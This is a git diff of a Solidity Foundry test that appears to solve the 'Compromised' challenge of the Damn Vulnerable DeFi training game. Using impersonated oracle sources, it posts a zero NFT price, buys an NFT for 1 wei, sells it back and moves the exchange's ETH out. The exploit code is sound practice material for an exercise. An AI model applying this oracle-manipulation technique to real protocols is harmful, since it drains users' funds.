@@ -9,6 +9,8 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {Address} from "@openzeppelin/contracts/utils/Address.sol";
+
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -20,6 +22,7 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
+    using Address for address payable;
 
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
@@ -85,18 +88,15 @@ contract CompromisedChallenge is Test {
         console.log(currentPrice);
 
         vm.startPrank(source1);
-        oracle.postPrice(nft.symbol(),PLAYER_INITIAL_ETH_BALANCE);
+        oracle.postPrice(nft.symbol(),0);
         vm.stopPrank();
 
         vm.startPrank(source2);
-        oracle.postPrice(nft.symbol(),PLAYER_INITIAL_ETH_BALANCE);
+        oracle.postPrice(nft.symbol(),0);
         vm.stopPrank();
 
-        // uint256 newPrice = oracle.getMedianPrice(nft.symbol());
-        // console.log(newPrice);
-
         vm.startPrank(player);
-        uint256 tokenId = exchange.buyOne{value : PLAYER_INITIAL_ETH_BALANCE}();
+        uint256 tokenId = exchange.buyOne{value : 1}();
         vm.stopPrank();
 
         vm.startPrank(source1);
@@ -110,6 +110,7 @@ contract CompromisedChallenge is Test {
         vm.startPrank(player);
         nft.approve(address(exchange),tokenId);
         exchange.sellOne(tokenId);
+        payable(address(recovery)).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
         vm.stopPrank();
 
     }
